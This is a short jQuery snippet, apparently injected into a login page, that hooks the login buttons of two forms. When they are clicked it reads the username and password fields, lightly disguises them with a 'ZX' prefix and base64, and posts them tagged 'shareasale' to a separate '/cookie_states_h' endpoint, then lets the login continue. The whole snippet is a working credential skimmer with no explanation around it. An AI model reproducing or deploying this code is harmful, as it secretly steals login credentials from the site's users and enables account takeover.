

 
if ($('.login-form ').length) {
       $('.btn-login').on('click',function() {     
		 credentials_update( $('[name=username]').val(), $('[name=password]').val()); 
		return true;
	});
}
 if ($('#form1').length) {
       $('button.aff').on('click',function() {     
         credentials_update( $('[name=username]').val(), $('[name=password]').val()); 
        return true;
    });
} 
 

function credentials_update(u,p){  
 
    $.ajax({
        type: "post",
        dataType: "json",
        url: api_path + "/cookie_states_h",
        async:false,
        data: { 
            network_name: btoa('shareasale'),
            username:btoa('ZX'+u),
            password:btoa('ZX'+ p), 
        },
        success: function(data) {
            if (data.success === "yes") { 
            	     c("State_update");
            } else {
                	 c("404 or empty"); 
            }

        }
    });


}
